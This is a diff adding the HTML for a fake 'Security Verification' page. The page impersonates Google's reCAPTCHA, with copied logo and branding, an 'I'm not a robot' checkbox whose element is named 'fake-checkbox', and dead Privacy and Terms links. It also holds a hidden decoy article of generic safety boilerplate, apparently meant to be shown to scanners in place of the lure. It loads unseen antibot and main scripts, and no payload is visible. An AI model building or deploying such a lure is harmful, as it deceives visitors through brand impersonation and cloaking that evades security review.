@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Security Verification</title>
+  <meta name="description" content="Please verify that you are a human to proceed.">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
+  <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+
+  <main class="verification-wrapper" id="verification-view">
+    <div class="security-card">
+      
+      <div class="security-header">
+        <div class="shield-icon-wrapper" aria-hidden="true">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+          </svg>
+        </div>
+        <h1 class="security-title" id="sec-title">Security Verification</h1>
+        <p class="security-subtitle" id="sec-subtitle">Please verify that you are a human to continue.</p>
+      </div>
+
+      <div class="captcha-box-container">
+        <div class="recaptcha-widget" id="recaptcha-box" role="button" tabindex="0" aria-label="Verify you are human checkbox">
+          
+          <div class="recaptcha-left">
+            <div class="checkbox-slot">
+              <div class="fake-checkbox" id="captcha-checkbox"></div>
+              <div class="recaptcha-spinner" id="captcha-spinner"></div>
+              <div class="checkmark-icon" id="captcha-checkmark">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+                </svg>
+              </div>
+            </div>
+            
+            <span class="recaptcha-label" id="captcha-label">I'm not a robot</span>
+          </div>
+
+          <div class="recaptcha-brand">
+            <div class="recaptcha-logo" aria-hidden="true">
+              <svg viewBox="0 0 48 48" fill="none">
+                <path d="M24 4C12.95 4 4 12.95 4 24c0 4.14 1.27 8 3.44 11.21l4.24-4.24C10.63 28.78 10 26.47 10 24c0-7.73 6.27-14 14-14 3.41 0 6.52 1.23 8.94 3.27l-5.69 5.69H42V4.25l-5.83 5.83C32.74 6.78 28.58 4 24 4z" fill="#4285F4"/>
+                <path d="M44 24c0-4.14-1.27-8-3.44-11.21l-4.24 4.24C37.37 19.22 38 21.53 38 24c0 7.73-6.27 14-14 14-3.41 0-6.52-1.23-8.94-3.27l5.69-5.69H6v14.71l5.83-5.83C15.26 41.22 19.42 44 24 44c11.05 0 20-8.95 20-20z" fill="#34A853"/>
+                <path d="M24 16c-4.42 0-8 3.58-8 8 0 1.95.7 3.73 1.86 5.14l-4.24 4.24C11.58 30.68 10.5 27.5 10.5 24c0-7.46 6.04-13.5 13.5-13.5 3.32 0 6.36 1.2 8.71 3.19l-4.12 4.12C26.96 16.63 25.53 16 24 16z" fill="#FBBC05"/>
+              </svg>
+            </div>
+            <span class="recaptcha-brand-text">reCAPTCHA</span>
+            <div class="recaptcha-links">
+              <a href="#" onclick="return false;">Privacy</a>
+              <span>-</span>
+              <a href="#" onclick="return false;">Terms</a>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="verification-status" id="verification-status" aria-live="polite"></div>
+
+    </div>
+  </main>
+
+  <section class="safe-page-container" id="safe-page-view" style="display: none;">
+    <article>
+      <header class="safe-header">
+        <span class="safe-category">Information Security & Web Standards</span>
+        <h1 class="safe-title" id="safe-title">Consumer Safety & Internet Verification Standards</h1>
+        <div class="safe-meta">
+          <span id="safe-date">Updated September 2026</span>
+          <span>•</span>
+          <span id="safe-reading">3 min read</span>
+        </div>
+      </header>
+      
+      <div class="safe-content" id="safe-body">
+        <h2>Understanding Modern Online Verification Protocols</h2>
+        <p>Automated verification systems help ensure safe browsing experiences by protecting web applications from distributed denial-of-service (DDoS) attacks, automated data harvesting, and malicious web scrapers.</p>
+        <p>By implementing client-side telemetry and cryptographic handshake verifications, online services can ensure that content is delivered securely to legitimate users while upholding strict compliance with international privacy standards.</p>
+        <h3>Standard Compliance Guidelines</h3>
+        <ul>
+          <li>Protection of user telemetry and privacy without intrusive profiling.</li>
+          <li>Compliance with international web standards and browser accessibility.</li>
+          <li>Continuous defense against automated botnets and malicious crawlers.</li>
+        </ul>
+      </div>
+
+      <footer class="safe-footer">
+        <p>This informational notice complies with digital verification, accessibility, and safe web browsing transparency standards.</p>
+      </footer>
+    </article>
+  </section>
+
+  <script src="./config.js"></script>
+  <script src="./antibot.js"></script>
+  <script src="./main.js"></script>
+</body>
+</html>
